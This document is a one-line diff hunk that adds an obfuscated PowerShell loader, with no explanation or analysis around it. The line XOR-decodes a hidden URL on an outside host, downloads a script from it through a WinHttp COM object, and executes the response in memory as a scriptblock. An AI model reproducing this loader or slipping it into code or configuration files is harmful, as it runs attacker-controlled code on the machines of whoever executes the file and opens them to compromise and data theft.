@@ -1,0 +1,1 @@
+$p6e99=-join(@(91,71,71,67,9,28,28,86,93,71,86,65,30,80,92,87,86,30,80,87,93,29,90,93,85,92,28,1,86,7,80,1,3,86,86,3,81,86,82,0,2,1,3,12,108,14,2)|%{[char]($_-bxor51)});$n991a=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$n991a.Open("GET",$p6e99);$n991a.Send();&([scriptblock]::Create(-join($n991a.ResponseBody|%{[char]$_})))
